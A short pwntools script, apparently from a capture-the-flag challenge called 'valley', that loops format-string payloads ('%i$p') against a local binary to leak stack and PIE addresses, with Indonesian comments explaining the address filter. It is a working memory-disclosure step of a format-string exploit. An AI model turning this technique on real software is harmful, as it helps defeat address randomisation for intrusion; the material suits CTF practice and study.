from pwn import *

context.log_level = "error"

for i in range(32):
    pay = f"%{i}$p"

    p = process("./valley")
    p.sendlineafter(b":",pay.encode())
    p.recvuntil(b"distance: ")

    leak = p.recvline().decode()
    
    if leak.startswith("0x7") or leak.startswith("0x5"):
        print(f"index {i} : {leak.strip()}")
        # filter ini dibuat karena stack biasanya berlokasi di alamat memori tinggi : 0x7f--> 
        # dan me leak PIE dari program : 0x5-->

    p.close()




